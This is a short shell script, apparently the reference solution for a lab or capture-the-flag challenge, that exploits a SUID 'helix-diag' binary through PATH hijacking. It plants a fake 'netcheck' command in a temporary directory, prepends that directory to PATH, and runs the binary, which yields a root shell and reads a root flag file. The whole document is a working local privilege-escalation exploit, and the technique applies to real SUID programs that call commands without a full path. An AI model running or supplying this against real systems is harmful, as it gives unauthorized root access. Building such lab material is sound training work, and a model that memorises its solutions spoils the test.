#!/bin/sh
# Reference privesc for Chain C terminus — run this AS the remote-ops user
# (the binary is 4750 root:remote-ops; service shells get Permission denied).
# Turns the SUID helix-diag's unqualified `netcheck` call into a root shell
# via PATH hijack.
#
# Usage:  sh privesc.sh /path/to/helix-diag

DIAG="${1:-/opt/helix/helix-diag}"

WORK="$(mktemp -d)"
cat > "$WORK/netcheck" <<'EOF'
#!/bin/sh
id
cat /root/root.flag 2>/dev/null
/bin/sh
EOF
chmod +x "$WORK/netcheck"

echo "[*] hijacking PATH and invoking SUID $DIAG"
PATH="$WORK:$PATH" "$DIAG"
